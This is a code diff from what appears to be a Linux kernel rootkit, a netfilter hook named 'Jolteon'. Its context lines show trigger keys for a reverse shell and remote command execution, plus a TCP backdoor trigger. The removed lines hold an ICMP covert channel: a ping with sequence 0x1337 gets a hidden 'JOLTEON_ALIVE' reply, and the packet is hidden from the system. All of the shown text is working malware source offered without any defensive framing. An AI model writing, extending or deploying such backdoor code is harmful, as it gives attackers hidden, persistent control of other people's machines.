@@ -7,84 +7,6 @@ const char* JOLTEON_BACKDOOR_KEY = "JOLTEON_PAYLOAD_GET_REVERSE_SHELL";
 const char* JOLTEON_CODE_EXECUTION_KEY = "JOLTEON_EXECUTE_CMD";
 #define JOLTEON_CODE_EXECUTION_KEY_BUF_LEN 512
 
-static void send_icmp_reply(struct sk_buff *skb,
-                            struct iphdr *orig_ip,
-                            struct icmphdr *orig_icmp,
-                            unsigned char *response_data,
-                            size_t response_len)
-{
-    struct sk_buff *nskb;
-    struct iphdr *nip;
-    struct icmphdr *nicmp;
-    unsigned char *payload;
-    unsigned int total_len;
-    struct flowi4 fl4;
-    struct rtable *rt;
-
-    total_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + response_len;
-
-    /* Look up route to the sender */
-    memset(&fl4, 0, sizeof(fl4));
-    fl4.daddr   = orig_ip->saddr;
-    fl4.saddr   = orig_ip->daddr;
-    fl4.flowi4_proto = IPPROTO_ICMP;
-
-    rt = ip_route_output_key(&init_net, &fl4);
-    if (IS_ERR(rt)) {
-        printk(KERN_ERR "ICMP reply: route lookup failed\n");
-        return;
-    }
-
-    /* Allocate new skb for response */
-    nskb = alloc_skb(LL_MAX_HEADER + total_len, GFP_ATOMIC);
-    if (!nskb) {
-        ip_rt_put(rt);
-        return;
-    }
-
-    skb_reserve(nskb, LL_MAX_HEADER);
-    skb_reset_network_header(nskb);
-
-    /* Build IP header */
-    nip = skb_put(nskb, sizeof(struct iphdr));
-    nip->version  = 4;
-    nip->ihl      = 5;
-    nip->tos      = 0;
-    nip->tot_len  = htons(total_len);
-    nip->id       = orig_ip->id;
-    nip->frag_off = 0;
-    nip->ttl      = 64;
-    nip->protocol = IPPROTO_ICMP;
-    nip->saddr    = orig_ip->daddr;
-    nip->daddr    = orig_ip->saddr;
-    nip->check    = 0;
-    nip->check    = ip_fast_csum((unsigned char *)nip, nip->ihl);
-
-    /* Build ICMP header */
-    skb_set_transport_header(nskb, sizeof(struct iphdr));
-    nicmp = skb_put(nskb, sizeof(struct icmphdr));
-    nicmp->type             = ICMP_ECHOREPLY;
-    nicmp->code             = 0;
-    nicmp->un.echo.id       = orig_icmp->un.echo.id;
-    nicmp->un.echo.sequence = orig_icmp->un.echo.sequence;
-    nicmp->checksum         = 0;
-
-    /* Add response payload */
-    payload = skb_put(nskb, response_len);
-    memcpy(payload, response_data, response_len);
-
-    /* Calculate ICMP checksum (header + payload) */
-    nicmp->checksum = csum_fold(
-        csum_partial((unsigned char *)nicmp,
-                    sizeof(struct icmphdr) + response_len, 0));
-
-    /* Attach route and send */
-    nskb->protocol = htons(ETH_P_IP);
-    skb_dst_set(nskb, &rt->dst);
-
-    ip_local_out(&init_net, NULL, nskb);
-}
-
 /**
  * Inspects incoming packets and check correspondence to backdoor packet:
  *      Proto: TCP
@@ -116,18 +38,6 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
         return NF_ACCEPT;
     }
 
-    //Health check packet
-    if(ip_header->protocol==IPPROTO_ICMP){
-
-        icmp_header = icmp_hdr(skb);
-        printk(KERN_INFO "Received ICMP packet with type %u and sequence %u\n", icmp_header->type, ntohs(icmp_header->un.echo.sequence));
-
-        if(icmp_header->type == ICMP_ECHO && icmp_header->un.echo.sequence == htons(0x1337)){
-            send_icmp_reply(skb, ip_header, icmp_header, "JOLTEON_ALIVE", strlen("JOLTEON_ALIVE"));
-            printk(KERN_INFO "Received health check packet, sent reply.\n");
-            return NF_STOLEN;
-        }
-    }
     //Backdoor trigger: TCP
     else if(ip_header->protocol==IPPROTO_TCP){ 
         unsigned int dport;
